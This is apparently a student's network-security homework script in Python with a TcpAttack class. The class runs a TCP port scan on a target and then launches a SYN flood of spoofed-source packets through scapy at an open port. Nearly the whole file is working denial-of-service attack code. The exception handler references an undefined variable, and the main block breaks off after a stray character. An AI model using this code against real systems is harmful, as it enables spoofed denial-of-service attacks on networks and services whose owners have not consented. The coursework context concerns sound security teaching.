#!/usr/bin/python3

# HW8
# Vivek Khanolkar
# vkhanolk
# 3/30/2021

import sys, socket
import re
import os.path

from scapy.all import *

class TcpAttack:

    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
    
    def scanTarget(self, rangeStart, rangeEnd): # NOTE : code modified from Professor Avi Kak's Lecture 16 port_scan.py
        open_ports = []

        outFile = open('openports.txt', 'w')
        # Scan the ports in the specified range:
        for testport in range(rangeStart, rangeEnd+1):                               
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )               
            sock.settimeout(0.1)                                                     
            try:                                                                     
                sock.connect( (self.targetIP, testport) )                                 
                open_ports.append(testport)                                                                                         
            except:                                                                  
                print("port is closed")                                                

        for x in open_ports:
            outFile.write("%s\n" % x)
        
        outFile.close()
     
    def attackTarget(self, port, numSyn): # NOTE : code modified from Professor Avi Kak's Lecture 16 DoS5.py                                            
        with open('openports.txt', 'r') as myFile:
            enc = myFile.readlines()

        inc = [int(x) for x in enc]
        if port in inc:             #if our port is open
            for i in range(numSyn):                                                       
                IP_header = IP(src = self.spoofIP, dst = self.targetIP)                                
                TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)     
                packet = IP_header / TCP_header                                          
                try:                                                                     
                    send(packet)                                                          
                except:                                                   
                    print (e)    
            return 1
        else:
            return 0                                                           

if __name__ == '__main__':
    j